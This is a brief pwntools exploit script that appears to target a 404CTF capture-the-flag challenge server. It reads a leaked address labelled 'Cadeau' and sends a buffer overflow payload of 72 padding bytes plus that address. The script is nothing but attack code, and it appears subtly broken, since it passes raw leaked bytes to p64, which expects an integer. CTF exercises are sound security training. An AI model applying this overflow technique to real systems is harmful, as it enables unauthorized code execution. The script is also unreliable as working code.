from pwn import *

p = remote("challenge.404ctf.fr", "31720")
txt = p.recvline()
txt = txt.split(b"Cadeau : ")
txt = txt[-1]

p.sendline(b"A"*72+p64(txt))
